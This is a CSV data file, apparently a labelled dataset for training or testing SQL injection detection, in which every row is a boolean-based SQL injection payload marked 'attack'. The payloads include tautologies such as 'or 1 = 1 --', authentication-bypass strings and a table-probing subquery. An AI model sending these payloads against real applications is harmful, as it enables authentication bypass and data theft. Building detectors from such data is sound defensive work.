label,payload,family
attack," select * from users where id  =  1 or ""&  (  "" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or ""?  (  "" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or "",;"" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or "",."" or 1  =  1 -- 1",boolean
attack,admin'  )   or   (  '1'  =  '1,boolean
attack,  )   or   (  'x'  =  'x,boolean
attack,select * from users where id  =  1 %!<1 or 1  =  1 -- 1,boolean
attack," select * from users where id  =  1 or ""]1"" or 1  =  1 -- 1",boolean
attack,select * from users where id  =  1. <@ or 1  =  1 -- 1,boolean
attack, or true--,boolean
attack," select * from users where id  =  1 or "",  (  "" or 1  =  1 -- 1",boolean
attack,"admin"" or ""1""  =  ""1""/*",boolean
attack,"""  )   or true--",boolean
attack," select * from users where id  =  1 or ""  (  {"" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or ""{;"" or 1  =  1 -- 1",boolean
attack,or ''  =  ',boolean
attack,"23 or 1  =  1, --",boolean
attack,select * from users where id  =  1 &@ or 1  =  1 -- 1,boolean
attack," select * from users where id  =  1 or ""??"" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or "".  )  "" or 1  =  1 -- 1",boolean
attack,or a  =  a,boolean
attack,select * from users where id  =  1 <@. or 1  =  1 -- 1,boolean
attack," select * from users where id  =  1 or "";["" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or ""1#"" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or "";_"" or 1  =  1 -- 1",boolean
attack,"admin""or 1  =  1 or """"  =  """,boolean
attack,"1' and 1  =    (  select count  (  *  )   from tablenames  )  , --",boolean
attack,select * from users where id  =  '1'<@.. or 1  =  1 -- 1',boolean
attack,select * from users where id  =  '1' or \<\. or 1  =  1 -- 1',boolean
attack,"x' AND email IS NULL, --",boolean
attack," select * from users where id  =  1 or ""  )  ;"" or 1  =  1 -- 1",boolean
attack, or 0  =  0 --,boolean
